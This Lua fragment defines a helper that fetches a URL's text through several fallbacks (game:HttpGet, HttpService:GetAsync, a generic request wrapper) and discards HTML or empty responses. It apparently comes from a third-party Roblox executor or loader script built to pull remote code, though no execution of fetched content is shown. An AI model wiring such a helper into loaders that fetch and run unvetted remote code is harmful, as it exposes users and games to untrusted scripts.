local function _safeGet(url)
	if type(url) ~= "string" then return nil end
	local function _isValidContent(s)
		if type(s) ~= "string" or #s < 4 then return false end
		local _h = _sb(s, 1, 1)
		if _h == "<" then return false end
		return true
	end
	if type(game.HttpGet) == "function" then
		local _ok, _res = pcall(function() return game:HttpGet(url) end)
		if _ok and _isValidContent(_res) then return _res end
	end
	if HttpService and type(HttpService.GetAsync) == "function" then
		local _ok, _res = pcall(function() return HttpService:GetAsync(url, false) end)
		if _ok and _isValidContent(_res) then return _res end
	end
	local _resp = _requestCall({Url = url, Method = "GET"})
	if _resp then
		local _body = _resp.Body or _resp.body
		if _isValidContent(_body) then return _body end
	end
	return nil
end

